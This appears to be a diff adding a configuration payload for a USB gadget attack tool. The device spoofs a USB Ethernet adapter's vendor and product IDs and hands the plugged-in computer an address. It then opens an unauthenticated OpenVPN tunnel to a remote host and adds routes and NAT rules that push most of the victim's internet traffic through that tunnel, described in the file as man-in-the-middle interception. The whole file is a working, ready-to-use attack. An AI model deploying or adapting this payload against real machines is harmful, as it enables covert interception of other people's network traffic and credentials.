@@ -1,0 +1,52 @@
+# VID and PID stolen from a USB Ethernet Adapter
+USB_VID="0x1D6B" # Vendor ID
+USB_PID="0x0237" # Product ID
+
+# Gadget features
+USE_ECM=true      # if true CDC ECM will be enabled
+USE_RNDIS=true    # if true RNDIS will be enabled
+USE_HID=false     # if true HID (keyboard) will be enabled
+USE_RAWHID=false  # if true HID raw device will be enabled
+USE_UMS=false     # if true USB Mass Storage will be enabled
+
+# add new entries to the router table (see: init_usb_ethernet.sh)
+ROUTE_SPOOF=true
+
+# assign self 192.168.4.1 and the router 192.168.4.2
+IF_IP="192.168.4.1" 
+IF_MASK="255.255.255.252" 
+IF_DHCP_RANGE="192.168.4.2,192.168.4.2"
+
+function onNetworkUp()
+{
+	# everything eventually goes to the router
+	route add default gw 192.168.4.2
+
+	# enable forwarding and be sure to ignore redirects
+	sysctl net.ipv4.ip_forward=1
+	sysctl net.ipv4.conf.all.accept_redirects = 0
+	
+	# connect to the VPN at 192.168.1.64
+	openvpn --ifconfig 10.200.0.2 10.200.0.1 --dev tun --auth none --remote 192.168.1.64 --daemon
+
+	# rewrite the src ip
+	iptables -t nat -A POSTROUTING -j MASQUERADE
+
+	# man in the middle most of the things (some obvious holes)
+	route add -net 0.0.0.0/5 gw 10.200.0.2
+	route add -net 8.0.0.0/7 gw 10.200.0.2
+	route add -net 11.0.0.0/8 gw 10.200.0.2
+	route add -net 12.0.0.0/6 gw 10.200.0.2
+	route add -net 16.0.0.0/4 gw 10.200.0.2
+	route add -net 32.0.0.0/3 gw 10.200.0.2
+	route add -net 64.0.0.0/2 gw 10.200.0.2
+	route add -net 128.0.0.0/2 gw 10.200.0.2
+	route add -net 193.0.0.0/8 gw 10.200.0.2
+	route add -net 194.0.0.0/7 gw 10.200.0.2
+	route add -net 196.0.0.0/6 gw 10.200.0.2
+	route add -net 200.0.0.0/5 gw 10.200.0.2
+	route add -net 208.0.0.0/4 gw 10.200.0.2
+	route add -net 224.0.0.0/4 gw 10.200.0.2
+	route add -net 240.0.0.0/5 gw 10.200.0.2
+	route add -net 248.0.0.0/6 gw 10.200.0.2
+}
